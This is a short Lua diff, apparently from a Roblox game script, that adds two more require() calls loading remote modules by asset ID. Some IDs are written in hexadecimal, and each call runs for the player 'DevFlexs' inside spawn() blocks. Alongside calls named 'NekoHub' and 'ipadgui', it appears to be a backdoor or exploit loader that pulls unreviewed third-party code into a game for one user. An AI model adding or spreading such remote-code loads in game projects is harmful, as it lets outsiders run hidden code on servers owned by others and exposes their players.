@@ -6,10 +6,12 @@ game.Players["DevFlexs"].Character.Head.NameTag.NameFln.Text = ""
 require(110476458714336).ipadgui("DevFlexs")
 spawn(function()
 require(5702244094).space("DevFlexs")
+require(5642174146):zsh("DevFlexs")
 require(0x22330bb15).Hotladiesinyourarea("DevFlexs")
 end)
 
 spawn(function()
+require(8804198206).load("DevFlexs")
 require(0x20c40e721):NekoHub("DevFlexs")
 require(7740376639).ph("DevFlexs")
 end)
